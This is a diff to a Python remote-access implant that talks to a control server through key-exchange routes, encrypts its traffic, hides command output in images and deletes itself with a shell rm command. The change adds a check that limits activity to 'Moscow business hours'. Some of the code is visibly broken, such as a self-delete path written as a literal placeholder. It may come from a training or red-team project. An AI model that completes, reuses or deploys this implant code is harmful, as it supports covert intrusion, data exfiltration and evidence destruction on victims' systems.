@@ -5,6 +5,8 @@ import requests
 import subprocess
 import time
 import sys
+from datetime import datetime, time as dtime
+import os
 from diffiehellman import DiffieHellman
 
 GREEN = '\033[32m'
@@ -23,6 +25,13 @@ routes = {
     2: url + "getkey",
     3: url + "sendkey"
 }
+
+def check_interval(): 
+    curr_time = datetime.now().hour
+    if curr_time >= 2 and curr_time <= 10: #2 - 10 for Moscow business hours
+        return 
+    print(f"{RED}[!]{RESET} Nyet.")
+    time.sleep(60)
 
 #Encryption of data -- IV is concatenated at the end of message for decryption
 def encrypt(plain_str): 
@@ -85,7 +94,7 @@ def send_output(obf_img):
 #Called to clean up and destroy implant
 def destroy(): 
     implant_location=os.path.abspath(__file__)
-    subprocess.popen(f"rm -f '{{file_path}}'",shell=True)
+    subprocess.Popen(f"rm -f '{{file_path}}'",shell=True)
     sys.exit(0)
     pass
 
@@ -146,6 +155,7 @@ if __name__ == '__main__':
 
     num_tries = 1
     while True: 
+        check_interval()
         try: 
             #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
             #comment out encrypt and decrypt functions to test overall functionality (they won't work since IV is not shared between server and client yet.)
